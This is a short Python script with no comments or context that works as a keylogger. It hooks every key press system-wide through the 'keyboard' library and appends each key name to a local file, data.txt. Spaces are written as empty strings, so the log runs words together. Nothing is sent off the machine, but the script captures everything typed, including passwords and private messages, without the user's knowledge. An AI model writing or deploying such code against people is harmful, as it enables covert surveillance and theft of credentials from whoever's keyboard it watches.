import keyboard

def pressedkeys(key):
    with open("data.txt", "a") as file:
        if key.name == "space":
            file.write('')
        else:
            file.write(key.name)

keyboard.on_press(pressedkeys)
keyboard.wait()
